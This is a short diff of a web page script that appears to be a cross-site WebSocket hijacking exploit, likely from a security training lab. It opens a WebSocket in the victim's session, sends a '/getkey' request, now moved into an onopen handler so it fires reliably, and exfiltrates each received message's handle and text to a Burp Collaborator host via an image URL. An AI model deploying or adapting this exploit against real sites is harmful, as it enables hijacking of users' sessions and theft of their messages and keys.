@@ -15,9 +15,10 @@
         li.src = "https://198rbrko3ob5ialyb78h4nfpggm6av.burpcollaborator.net?handle="+data.handle+"&text="+data.text
         ul.appendChild(li);
     };
-    var text   = "/getkey"
-    ws.send(JSON.stringify({  text: text }));
-
+    ws.onopen = function() {
+        var text   = "/getkey"
+        ws.send(JSON.stringify({  text: text }));
+    };
 
 </script>
 
